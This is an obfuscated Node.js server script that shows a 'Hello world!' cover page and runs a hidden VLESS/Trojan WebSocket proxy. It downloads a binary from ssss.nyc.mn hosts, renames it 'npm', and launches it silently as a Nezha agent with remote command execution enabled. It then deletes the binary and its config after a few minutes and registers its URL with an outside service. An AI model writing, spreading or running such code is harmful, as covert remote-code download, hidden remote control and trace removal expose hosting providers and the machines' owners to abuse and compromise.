const _0x3b4aa3=_0x4013;(function(_0x28a877,_0x5c445b){const _0x4f5c05=_0x4013,_0x44e433=_0x28a877();while(!![]){try{const _0x2fb812=-parseInt(_0x4f5c05(0x171))/0x1+parseInt(_0x4f5c05(0x113))/0x2*(-parseInt(_0x4f5c05(0x147))/0x3)+parseInt(_0x4f5c05(0x11c))/0x4*(-parseInt(_0x4f5c05(0x17f))/0x5)+parseInt(_0x4f5c05(0x141))/0x6+parseInt(_0x4f5c05(0x185))/0x7+parseInt(_0x4f5c05(0x126))/0x8+parseInt(_0x4f5c05(0x165))/0x9;if(_0x2fb812===_0x5c445b)break;else _0x44e433['push'](_0x44e433['shift']());}catch(_0x404bb6){_0x44e433['push'](_0x44e433['shift']());}}}(_0x53c7,0x2811e));const os=require('os'),http=require(_0x3b4aa3(0x164)),fs=require('fs'),axios=require(_0x3b4aa3(0x134)),net=require(_0x3b4aa3(0x139)),path=require(_0x3b4aa3(0x140)),crypto=require(_0x3b4aa3(0x11d)),{Buffer}=require(_0x3b4aa3(0x183)),{exec,execSync}=require(_0x3b4aa3(0x135)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3b4aa3(0x15f)]||'48b743ac-5691-44ce-bd37-ebdceb588a3e',NEZHA_SERVER=process[_0x3b4aa3(0x14b)][_0x3b4aa3(0x17b)]||'',NEZHA_PORT=process[_0x3b4aa3(0x14b)][_0x3b4aa3(0x159)]||'',NEZHA_KEY=process[_0x3b4aa3(0x14b)]['NEZHA_KEY']||'',DOMAIN=process[_0x3b4aa3(0x14b)]['DOMAIN']||_0x3b4aa3(0x154),AUTO_ACCESS=process[_0x3b4aa3(0x14b)][_0x3b4aa3(0x168)]||![],WSPATH=process[_0x3b4aa3(0x14b)]['WSPATH']||UUID[_0x3b4aa3(0x112)](0x0,0x8),SUB_PATH=process[_0x3b4aa3(0x14b)][_0x3b4aa3(0x13d)]||'sub',NAME=process['env'][_0x3b4aa3(0x132)]||'',PORT=process[_0x3b4aa3(0x14b)][_0x3b4aa3(0x16c)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x84db70=_0x3b4aa3;try{const _0x9aab16=await axios[_0x84db70(0x130)]('https://speed.cloudflare.com/meta'),_0x54d748=_0x9aab16['data'];ISP=(_0x54d748[_0x84db70(0x14d)]+'-'+_0x54d748[_0x84db70(0x146)])[_0x84db70(0x123)](/ /g,'_');}catch(_0x27c6ef){ISP=_0x84db70(0x144);}};function _0x4013(_0x3447f0,_0x3adb52){_0x3447f0=_0x3447f0-0x10f;const _0x53c7ea=_0x53c7();let _0x4013cf=_0x53c7ea[_0x3447f0];return _0x4013cf;}GetISP();const httpServer=http[_0x3b4aa3(0x163)]((_0x2d6081,_0x365d5d)=>{const _0x58fb86=_0x3b4aa3;if(_0x2d6081[_0x58fb86(0x181)]==='/'){const _0x24b486=path[_0x58fb86(0x178)](__dirname,_0x58fb86(0x142));fs[_0x58fb86(0x128)](_0x24b486,_0x58fb86(0x15d),(_0x2e8485,_0x5c31f8)=>{const _0x2be85e=_0x58fb86;if(_0x2e8485){_0x365d5d[_0x2be85e(0x120)](0xc8,{'Content-Type':_0x2be85e(0x145)}),_0x365d5d[_0x2be85e(0x14f)](_0x2be85e(0x111));return;}_0x365d5d[_0x2be85e(0x120)](0xc8,{'Content-Type':_0x2be85e(0x145)}),_0x365d5d[_0x2be85e(0x14f)](_0x5c31f8);});return;}else{if(_0x2d6081['url']==='/'+SUB_PATH){const _0x128476=NAME?NAME+'-'+ISP:ISP,_0x497d15=_0x58fb86(0x131)+UUID+_0x58fb86(0x16e)+DOMAIN+_0x58fb86(0x170)+DOMAIN+_0x58fb86(0x14a)+WSPATH+'#'+_0x128476,_0x375eaa=_0x58fb86(0x143)+UUID+_0x58fb86(0x174)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x58fb86(0x14a)+WSPATH+'#'+_0x128476,_0x398f5a=_0x497d15+'\x0a'+_0x375eaa,_0x32292d=Buffer[_0x58fb86(0x180)](_0x398f5a)[_0x58fb86(0x151)]('base64');_0x365d5d['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x365d5d['end'](_0x32292d+'\x0a');}else _0x365d5d['writeHead'](0x194,{'Content-Type':_0x58fb86(0x16a)}),_0x365d5d[_0x58fb86(0x14f)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x3b4aa3(0x115))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x3b4aa3(0x14c),'1.1.1.1'];function resolveHost(_0x22a0f4){return new Promise((_0xaa3e43,_0x5f14e8)=>{const _0x4be6ea=_0x4013;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4be6ea(0x16d)](_0x22a0f4)){_0xaa3e43(_0x22a0f4);return;}let _0x5c0a6a=0x0;function _0x2f33da(){const _0x119f00=_0x4be6ea;if(_0x5c0a6a>=DNS_SERVERS[_0x119f00(0x152)]){_0x5f14e8(new Error(_0x119f00(0x167)+_0x22a0f4+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x58d364=DNS_SERVERS[_0x5c0a6a];_0x5c0a6a++;const _0x3daf27=_0x119f00(0x17e)+encodeURIComponent(_0x22a0f4)+_0x119f00(0x119);axios['get'](_0x3daf27,{'timeout':0x1388,'headers':{'Accept':_0x119f00(0x157)}})[_0x119f00(0x172)](_0x5f5b74=>{const _0x7c125d=_0x119f00,_0x43f8ce=_0x5f5b74[_0x7c125d(0x125)];if(_0x43f8ce[_0x7c125d(0x11f)]===0x0&&_0x43f8ce[_0x7c125d(0x153)]&&_0x43f8ce[_0x7c125d(0x153)]['length']>0x0){const _0x439924=_0x43f8ce[_0x7c125d(0x153)][_0x7c125d(0x17a)](_0x368221=>_0x368221[_0x7c125d(0x122)]===0x1);if(_0x439924){_0xaa3e43(_0x439924['data']);return;}}_0x2f33da();})[_0x119f00(0x137)](_0x5b299b=>{_0x2f33da();});}_0x2f33da();});}function handleVlessConnection(_0x1315d3,_0x2e2984){const _0x4f47c1=_0x3b4aa3,[_0xbbf3e7]=_0x2e2984,_0x18c7fe=_0x2e2984[_0x4f47c1(0x112)](0x1,0x11);if(!_0x18c7fe['every']((_0x3adb36,_0x24eaab)=>_0x3adb36==parseInt(uuid[_0x4f47c1(0x155)](_0x24eaab*0x2,0x2),0x10)))return![];let _0x12dd76=_0x2e2984[_0x4f47c1(0x112)](0x11,0x12)['readUInt8']()+0x13;const _0x5e6625=_0x2e2984[_0x4f47c1(0x112)](_0x12dd76,_0x12dd76+=0x2)['readUInt16BE'](0x0),_0x456977=_0x2e2984[_0x4f47c1(0x112)](_0x12dd76,_0x12dd76+=0x1)[_0x4f47c1(0x127)](),_0x2844ff=_0x456977==0x1?_0x2e2984[_0x4f47c1(0x112)](_0x12dd76,_0x12dd76+=0x4)[_0x4f47c1(0x178)]('.'):_0x456977==0x2?new TextDecoder()[_0x4f47c1(0x160)](_0x2e2984[_0x4f47c1(0x112)](_0x12dd76+0x1,_0x12dd76+=0x1+_0x2e2984['slice'](_0x12dd76,_0x12dd76+0x1)['readUInt8']())):_0x456977==0x3?_0x2e2984[_0x4f47c1(0x112)](_0x12dd76,_0x12dd76+=0x10)[_0x4f47c1(0x179)]((_0x6f1755,_0x4853cf,_0xc138dc,_0x239b79)=>_0xc138dc%0x2?_0x6f1755[_0x4f47c1(0x129)](_0x239b79[_0x4f47c1(0x112)](_0xc138dc-0x1,_0xc138dc+0x1)):_0x6f1755,[])[_0x4f47c1(0x15e)](_0x1e52a3=>_0x1e52a3['readUInt16BE'](0x0)['toString'](0x10))[_0x4f47c1(0x178)](':'):'';_0x1315d3[_0x4f47c1(0x17d)](new Uint8Array([_0xbbf3e7,0x0]));const _0x3abb4d=createWebSocketStream(_0x1315d3);return resolveHost(_0x2844ff)[_0x4f47c1(0x172)](_0x30a1fa=>{const _0x1a1197=_0x4f47c1;net[_0x1a1197(0x12c)]({'host':_0x30a1fa,'port':_0x5e6625},function(){const _0x17c12c=_0x1a1197;this[_0x17c12c(0x169)](_0x2e2984['slice'](_0x12dd76)),_0x3abb4d['on'](_0x17c12c(0x166),()=>{})['pipe'](this)['on'](_0x17c12c(0x166),()=>{})[_0x17c12c(0x124)](_0x3abb4d);})['on']('error',()=>{});})[_0x4f47c1(0x137)](_0x2b0665=>{const _0x55a1b7=_0x4f47c1;net[_0x55a1b7(0x12c)]({'host':_0x2844ff,'port':_0x5e6625},function(){const _0x232c44=_0x55a1b7;this[_0x232c44(0x169)](_0x2e2984[_0x232c44(0x112)](_0x12dd76)),_0x3abb4d['on'](_0x232c44(0x166),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x3abb4d);})['on']('error',()=>{});}),!![];}function _0x53c7(){const _0xff5481=['application/json','join','reduce','find','NEZHA_SERVER','readUInt16BE','send','https://dns.google/resolve?name=','650NvJrOY','from','url','npm\x20is\x20running','buffer','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1112587RRqcBM','--tls','trim','Hello\x20world!','slice','2FKkDQJ','https://','Server','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','log','npm\x20is\x20already\x20running,\x20skip\x20running...','&type=A','npm','unlink','6196kwZPfw','crypto','2096','Status','writeHead','digest','type','replace','pipe','data','1837336kMyIun','readUInt8','readFile','concat','every','close','connect','https://arm64.ssss.nyc.mn/agent','finish','sha224','get','vless://','NAME','client_secret:\x20','axios','child_process','Server\x20is\x20running\x20on\x20port\x20','catch','post','net','arm64','2083','split','SUB_PATH','update','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','path','1504692gRJdIO','index.html','trojan://','Unknown','text/html','asOrganization','207669xdvsXk','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','&path=%2F','env','8.8.4.4','country','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','end','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','toString','length','Answer','databricks.a.9.3.0.d.1.f.1.0.7.4.0.1.0.0.2.ip6.arpa','substr','aarch64','application/dns-json','443','NEZHA_PORT','error:\x20','npm\x20download\x20successfully','listen','utf8','map','UUID','decode','false','8443','createServer','http','184248VTYmmt','error','Failed\x20to\x20resolve\x20','AUTO_ACCESS','write','text/plain','2087','PORT','test','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','includes','&fp=chrome&type=ws&host=','225143ekJeUs','then','connection','@cdns.doon.eu.org:443?security=tls&sni=','true','createWriteStream'];_0x53c7=function(){return _0xff5481;};return _0x53c7();}function handleTrojanConnection(_0x3fce8f,_0xda51d2){const _0x1aebd0=_0x3b4aa3;try{if(_0xda51d2[_0x1aebd0(0x152)]<0x3a)return![];const _0x348459=_0xda51d2[_0x1aebd0(0x112)](0x0,0x38)['toString'](),_0x14ba51=[UUID];let _0x2d66bb=null;for(const _0x47e6eb of _0x14ba51){const _0x4b4147=crypto['createHash'](_0x1aebd0(0x12f))[_0x1aebd0(0x13e)](_0x47e6eb)[_0x1aebd0(0x121)]('hex');if(_0x4b4147===_0x348459){_0x2d66bb=_0x47e6eb;break;}}if(!_0x2d66bb)return![];let _0x4f9c87=0x38;_0xda51d2[_0x4f9c87]===0xd&&_0xda51d2[_0x4f9c87+0x1]===0xa&&(_0x4f9c87+=0x2);const _0x4f2ec8=_0xda51d2[_0x4f9c87];if(_0x4f2ec8!==0x1)return![];_0x4f9c87+=0x1;const _0x40cec5=_0xda51d2[_0x4f9c87];_0x4f9c87+=0x1;let _0x2f8a29,_0x3c04ab;if(_0x40cec5===0x1)_0x2f8a29=_0xda51d2[_0x1aebd0(0x112)](_0x4f9c87,_0x4f9c87+0x4)[_0x1aebd0(0x178)]('.'),_0x4f9c87+=0x4;else{if(_0x40cec5===0x3){const _0x55ae16=_0xda51d2[_0x4f9c87];_0x4f9c87+=0x1,_0x2f8a29=_0xda51d2[_0x1aebd0(0x112)](_0x4f9c87,_0x4f9c87+_0x55ae16)[_0x1aebd0(0x151)](),_0x4f9c87+=_0x55ae16;}else{if(_0x40cec5===0x4)_0x2f8a29=_0xda51d2[_0x1aebd0(0x112)](_0x4f9c87,_0x4f9c87+0x10)[_0x1aebd0(0x179)]((_0x541cf1,_0x197d58,_0x437d19,_0x5dcf10)=>_0x437d19%0x2?_0x541cf1[_0x1aebd0(0x129)](_0x5dcf10[_0x1aebd0(0x112)](_0x437d19-0x1,_0x437d19+0x1)):_0x541cf1,[])[_0x1aebd0(0x15e)](_0x146f83=>_0x146f83[_0x1aebd0(0x17c)](0x0)[_0x1aebd0(0x151)](0x10))[_0x1aebd0(0x178)](':'),_0x4f9c87+=0x10;else return![];}}_0x3c04ab=_0xda51d2[_0x1aebd0(0x17c)](_0x4f9c87),_0x4f9c87+=0x2;_0x4f9c87<_0xda51d2[_0x1aebd0(0x152)]&&_0xda51d2[_0x4f9c87]===0xd&&_0xda51d2[_0x4f9c87+0x1]===0xa&&(_0x4f9c87+=0x2);const _0x170f7f=createWebSocketStream(_0x3fce8f);return resolveHost(_0x2f8a29)[_0x1aebd0(0x172)](_0xc86da=>{const _0xfe7725=_0x1aebd0;net[_0xfe7725(0x12c)]({'host':_0xc86da,'port':_0x3c04ab},function(){const _0x27cbf0=_0xfe7725;_0x4f9c87<_0xda51d2[_0x27cbf0(0x152)]&&this[_0x27cbf0(0x169)](_0xda51d2[_0x27cbf0(0x112)](_0x4f9c87)),_0x170f7f['on'](_0x27cbf0(0x166),()=>{})[_0x27cbf0(0x124)](this)['on']('error',()=>{})[_0x27cbf0(0x124)](_0x170f7f);})['on'](_0xfe7725(0x166),()=>{});})[_0x1aebd0(0x137)](_0xb59dc3=>{const _0x38ac99=_0x1aebd0;net['connect']({'host':_0x2f8a29,'port':_0x3c04ab},function(){const _0x477796=_0x4013;_0x4f9c87<_0xda51d2[_0x477796(0x152)]&&this[_0x477796(0x169)](_0xda51d2[_0x477796(0x112)](_0x4f9c87)),_0x170f7f['on'](_0x477796(0x166),()=>{})[_0x477796(0x124)](this)['on'](_0x477796(0x166),()=>{})[_0x477796(0x124)](_0x170f7f);})['on'](_0x38ac99(0x166),()=>{});}),!![];}catch(_0x16c9d1){return![];}}wss['on'](_0x3b4aa3(0x173),(_0x13204a,_0x2507b1)=>{const _0x47eff8=_0x3b4aa3,_0x1cc630=_0x2507b1[_0x47eff8(0x181)]||'';_0x13204a['once']('message',_0x3d82cf=>{const _0x524dbe=_0x47eff8;if(_0x3d82cf['length']>0x11&&_0x3d82cf[0x0]===0x0){const _0x30e6d7=_0x3d82cf[_0x524dbe(0x112)](0x1,0x11),_0x408e8a=_0x30e6d7[_0x524dbe(0x12a)]((_0x2ef3e6,_0x1b47a0)=>_0x2ef3e6==parseInt(uuid['substr'](_0x1b47a0*0x2,0x2),0x10));if(_0x408e8a){!handleVlessConnection(_0x13204a,_0x3d82cf)&&_0x13204a['close']();return;}}!handleTrojanConnection(_0x13204a,_0x3d82cf)&&_0x13204a[_0x524dbe(0x12b)]();})['on'](_0x47eff8(0x166),()=>{});});const getDownloadUrl=()=>{const _0x4c73d2=_0x3b4aa3,_0x570f11=os['arch']();return _0x570f11==='arm'||_0x570f11===_0x4c73d2(0x13a)||_0x570f11===_0x4c73d2(0x156)?!NEZHA_PORT?_0x4c73d2(0x149):_0x4c73d2(0x12d):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x4c73d2(0x148);},downloadFile=async()=>{const _0x2ed5be=_0x3b4aa3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x402f57=getDownloadUrl(),_0x1b816d=await axios({'method':_0x2ed5be(0x130),'url':_0x402f57,'responseType':'stream'}),_0x361e38=fs[_0x2ed5be(0x176)]('npm');return _0x1b816d[_0x2ed5be(0x125)]['pipe'](_0x361e38),new Promise((_0x3ecb9e,_0x4b397d)=>{const _0x472d57=_0x2ed5be;_0x361e38['on'](_0x472d57(0x12e),()=>{const _0x160c3d=_0x472d57;console[_0x160c3d(0x117)](_0x160c3d(0x15b)),exec('chmod\x20+x\x20npm',_0x44d355=>{if(_0x44d355)_0x4b397d(_0x44d355);_0x3ecb9e();});}),_0x361e38['on'](_0x472d57(0x166),_0x4b397d);});}catch(_0x331a4f){throw _0x331a4f;}},runnz=async()=>{const _0x499285=_0x3b4aa3;try{const _0xf5b6e1=execSync(_0x499285(0x13f),{'encoding':'utf-8'});if(_0xf5b6e1[_0x499285(0x110)]()!==''){console[_0x499285(0x117)](_0x499285(0x118));return;}}catch(_0x98ab13){}await downloadFile();let _0x58553c='',_0xa1c437=[_0x499285(0x158),_0x499285(0x162),_0x499285(0x11e),_0x499285(0x16b),_0x499285(0x13b),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4ae5a9=_0xa1c437[_0x499285(0x16f)](NEZHA_PORT)?_0x499285(0x10f):'';_0x58553c='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4ae5a9+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5553fb=NEZHA_SERVER[_0x499285(0x16f)](':')?NEZHA_SERVER[_0x499285(0x13c)](':')['pop']():'',_0x2ab0e9=_0xa1c437[_0x499285(0x16f)](_0x5553fb)?_0x499285(0x175):_0x499285(0x161),_0x1efbc4=_0x499285(0x133)+NEZHA_KEY+_0x499285(0x184)+NEZHA_SERVER+_0x499285(0x116)+_0x2ab0e9+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',_0x1efbc4);}_0x58553c=_0x499285(0x14e);}else{console[_0x499285(0x117)](_0x499285(0x150));return;}}try{exec(_0x58553c,{'shell':'/bin/bash'},_0x5362e5=>{const _0x42914e=_0x499285;if(_0x5362e5)console[_0x42914e(0x166)]('npm\x20running\x20error:',_0x5362e5);else console[_0x42914e(0x117)](_0x42914e(0x182));});}catch(_0x426bc2){console['error'](_0x499285(0x15a)+_0x426bc2);}};async function addAccessTask(){const _0x30c7e1=_0x3b4aa3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x59b532=_0x30c7e1(0x114)+DOMAIN+'/'+SUB_PATH;try{const _0x2b45e9=await axios[_0x30c7e1(0x138)]('https://oooo.serv00.net/add-url',{'url':_0x59b532},{'headers':{'Content-Type':_0x30c7e1(0x177)}});console[_0x30c7e1(0x117)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3ca8aa){}}const delFiles=()=>{const _0x390970=_0x3b4aa3;fs[_0x390970(0x11b)](_0x390970(0x11a),()=>{}),fs[_0x390970(0x11b)]('config.yaml',()=>{});};httpServer[_0x3b4aa3(0x15c)](PORT,()=>{const _0x2ee931=_0x3b4aa3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2ee931(0x117)](_0x2ee931(0x136)+PORT);});
